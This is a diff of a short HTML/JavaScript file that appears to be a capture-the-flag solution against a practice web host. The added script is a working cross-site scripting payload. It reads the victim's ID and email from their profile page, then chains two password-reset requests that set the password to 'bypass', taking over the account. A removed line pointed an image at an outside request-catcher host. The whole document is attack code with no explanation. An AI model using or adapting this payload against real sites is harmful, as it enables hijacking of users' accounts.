@@ -1,5 +1,43 @@
-<img id='zz'>
 <script>
-    let zz = document.getElementById('zz');
-    zz.src = "https://tlojeux.request.dreamhack.games/go";
+    fetch('http://ctf.segfaulthub.com:4498/mypage.php') 
+        .then(response => response.text())
+        .then(html => {
+        let parser = new DOMParser();
+        let doc = parser.parseFromString(html, 'text/html');
+        let id1 = doc.getElementsByTagName('td')[2].textContent;
+        let email = doc.getElementsByName('email')[0].placeholder;
+    
+        let formData = new URLSearchParams(); 
+        formData.append('id', id1); 
+        formData.append('email', email);
+        
+        fetch('http://ctf.segfaulthub.com:4498/forgetpw.php', {
+        method: 'POST',
+        headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: formData.toString()
+        })
+            .then(response => response.text())
+            .then(html => {
+            let parser = new DOMParser();
+            let doc2 = parser.parseFromString(html, 'text/html');
+            let idx = doc2.getElementsByName('idx')[0].value;
+            let newpass = 'bypass';
+            let chkpass = 'bypass';
+
+            let formData = new URLSearchParams(); 
+            formData.append('pw', newpass); 
+            formData.append('repw', chkpass);
+            formData.append('idx', idx);
+            
+            fetch('http://ctf.segfaulthub.com:4498/forgetpw.php', {
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: formData.toString()
+            })
+        })
+    })
 </script>
